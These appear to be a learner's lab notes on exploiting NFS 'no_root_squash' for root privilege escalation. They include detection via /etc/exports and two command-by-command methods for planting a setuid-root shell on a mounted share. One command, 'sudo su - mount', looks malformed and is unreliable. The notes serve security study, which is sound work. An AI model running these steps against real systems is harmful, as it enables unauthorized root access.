- Root squash is an administrative security feature in NFS that **prevents unauthorized root-level access to the NFS server by client machines**.
- no_root_squash,  **allows clients to access the file system as root**
- We can add files, remove them, **do anything as root but ONLY IN THE MOUNTED file system from remote**

# Detection
---
- `cat /etc/exports`
	- ![[Pasted image 20250501152850.png]]
- In linpeas:
	- ![[Pasted image 20250501152934.png]]
- We can mount `/tmp`folder 


# Exploitation
---
- ![[Pasted image 20250501153042.png]]
- Mount the `tmp`folder on Kali (Everything needs to be done on Kali):
	- `mkdir /tmp/mountme`
	- `mount -o rw,vers=2 10.10.106.218:/tmp /tmp/mountme`
		- If this does not work, use `vers=3`
- Make malicious `C`file:
	- `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mountme/x.c`
- Compile:
	- `gcc /tmp/mountme/x.c -o /tmp/mountme/x`
	- If we get errors, include `<unistd.h>`and `<stdlib.h>`
		- ![[Pasted image 20250501154334.png]]
		- ![[Pasted image 20250501154357.png]]
- `chmod +s /tmp/mountme/x`
- **ON victim now:**
---
	-  `/tmp/x`

# Method 2:
----
- Victim:
	`cp /bin/bash /tmp/bash`

- Attacker:
	- `sudo su - mount -o rw,vers=3 <THM-Box-IP>:/tmp /tmp/mountme`
	- `sudo chown root:root /tmp/mountme/bash `
	- `sudo chmod +s /tmp/mountme/bash`
- Victim:
	`/tmp/bash -p`
	![[Pasted image 20250501154905.png]]